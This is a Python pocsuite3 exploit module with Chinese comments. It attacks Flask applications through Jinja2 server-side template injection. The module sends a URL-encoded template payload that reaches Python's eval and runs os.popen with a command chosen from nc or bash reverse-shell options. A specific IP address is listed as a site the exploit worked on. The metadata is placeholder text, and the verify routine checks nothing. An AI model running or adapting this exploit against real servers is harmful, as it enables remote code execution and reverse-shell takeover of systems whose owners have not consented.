from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY

class DemoPOC(POCBase):
    vulID = '1.1'  # ssvid ID，如果是提交漏洞的同时提交POC，则写成0
    version = '1.1'  # 默认为1
    author = ['1.1']  # POC作者的名字
    vulDate = '1.1'  # 漏洞公开时间，不明确可以写今天
    createDate = '1.1'  # 编写POC的日期
    updateDate = '1.1'  # POC更新的时间，默认和编写时间一样
    references = ['flask']  # 漏洞地址来源，0day不用写
    name = 'flask'  # POC名称
    appPowerLink = 'flask'  # 漏洞厂商的地址
    appName = 'flask'  # 漏洞应用名称
    appVersion = 'flask'  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型
    desc = '''
    此EXP用于利用Flask应用的代码执行漏洞。
    '''  # 漏洞简要描述
    samples = ['96.234.71.117:80']  # 测试样例，使用POC测试成功的网站
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        """
        定义EXP的选项，提供不同的反向shell负载供选择。
        """
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
        """
        验证模式，目前只是初始化输出对象，未进行实际验证。
        """
        output = Output(self)
        result = {}
        return self.parse_verify(result)

    @staticmethod
    def trim(str):
        """
        去除字符串中的空格。
        """
        return ''.join(ch for ch in str if ch != ' ')

    def _attack(self):
        """
        执行攻击操作，构造恶意负载并发送请求。
        """
        result = {}
        path = "?name="
        url = self.url + path
        # 获取用户选择的命令
        cmd = self.get_option("command")
        # 构造恶意负载，用于执行命令
        payload = (
            'name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D'
            '%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D'
            '%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D'
            '%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D'
            '%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D'
            '%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22' + cmd + '%22).read()%27)%20%7D%7D'
            '%0A%20%20%20%20%7B%25%20endif%20%25%7D'
            '%0A%20%20%7B%25%20endif%20%25%7D'
            '%0A%20%20%7B%25%20endfor%20%25%7D'
            '%0A%7B%25%20endif%20%25%7D'
            '%0A%7B%25%20endfor%20%25%7D'
        )
        try:
            resq = requests.get(url + payload)
            t = resq.text
            # 去除响应中的换行符和空格
            t = t.replace('\n', '').replace('\r', '').replace(" ", "")
            print(t)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
        except Exception as e:
            logger.error(f"攻击过程中出现错误: {e}")
            return
        return self.parse_attack(result)

    def parse_attack(self, result):
        """
        解析攻击结果，输出成功或失败信息。
        """
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        """
        预留的shell交互方法，目前未实现。
        """
        return

    def parse_verify(self, result):
        """
        解析验证结果，输出成功或失败信息。
        """
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)